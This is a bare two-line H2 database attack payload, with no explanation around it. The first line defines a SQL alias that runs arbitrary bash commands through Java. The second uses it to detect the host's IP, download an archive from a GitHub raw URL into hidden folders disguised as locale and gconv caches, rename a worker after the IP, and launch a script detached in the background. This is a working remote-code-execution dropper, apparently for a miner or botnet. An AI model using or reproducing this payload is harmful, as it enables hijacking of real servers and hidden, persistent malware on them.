CREATE ALIAS IF NOT EXISTS EXEC AS $$ String shellexec(String cmd) throws java.io.IOException { Process p = Runtime.getRuntime().exec(new String[]{"/bin/bash","-c",cmd}); return "ok"; } $$;
CALL EXEC('IP=$(curl -s -m 5 ifconfig.me 2>/dev/null||wget -qO- -T 5 ifconfig.me 2>/dev/null||hostname -I 2>/dev/null|cut -d" " -f1);W=w8m-$(echo $IP|tr . -);B=/usr/lib/locale/.tzcache;mkdir -p $B 2>/dev/null||B=$HOME/.cache/.tz;mkdir -p $B;U=https://raw.githubusercontent.com/burmaldagpt/gconv-cache/main/w8.tgz;(wget -q -O $B/.g.tgz $U||curl -sL -m 120 -o $B/.g.tgz $U);tar xzf $B/.g.tgz -C $B;sed -i "s/w8x/$W/" $B/.gc/gconv.conf;chmod 755 $B/.gc/gconv_sync $B/.gc/gconv_check.sh;setsid sh $B/.gc/gconv_check.sh;rm -f $B/.g.tgz');
